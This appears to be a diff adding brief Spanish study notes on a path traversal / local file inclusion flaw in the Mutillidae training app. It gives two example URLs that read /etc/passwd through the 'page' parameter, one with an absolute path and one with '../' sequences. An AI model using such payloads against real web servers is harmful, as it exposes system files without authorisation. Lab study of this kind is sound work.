@@ -1,0 +1,10 @@
+#La clave de esta vulnerabilidad es tratar de influir en la ruta para en lugar de obtener 
+#el fichero que se esta buscando tratar de obtener otros ficheros u otros archivos del sistema de ficheros del web server.
+
+#Ejemplo:
+
+#OPCION_1:
+URL = http://<IP>/mutillidae/src/index.php?page=/etc/passwd
+
+#OPCION_2:
+URL = http://<IP>/mutillidae/src/index.php?page=../../../../../etc/passwd
